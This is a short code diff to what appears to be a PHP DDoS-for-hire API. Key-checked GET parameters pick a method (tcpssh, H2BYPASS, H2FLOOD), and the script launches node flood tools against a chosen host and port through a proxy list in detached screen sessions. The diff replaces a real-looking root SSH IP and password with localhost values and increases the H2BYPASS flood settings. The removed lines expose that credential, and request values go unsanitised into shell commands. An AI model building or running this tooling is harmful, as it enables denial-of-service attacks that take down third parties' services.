@@ -10,9 +10,9 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
     $key = $_GET['key'];
 
     $username = 'root';
-    $ip = '104.248.149.84';
+    $ip = '127.0.0.1';
     $ports = '22';
-    $password = 'Jancuk123@Asu';
+    $password = 'test';
 
     $allowedKeys = ['starpez'];
 
@@ -31,7 +31,7 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
             $command = "cd /var/www/html/test/ && screen -dm node tcpssh $host $port root $time";
             break;
         case 'H2BYPASS':
-            $command = "cd /var/www/html/test/ && screen -dm node bypass $host $time 8 2 proxy.txt";
+            $command = "cd /var/www/html/test/ && screen -dm node bypass $host $time 10 4 proxy.txt";
             break;
         case 'H2FLOOD':
             $command = "cd /var/www/html/test/ && screen -dm node blast $host $time 8 2 proxy.txt";
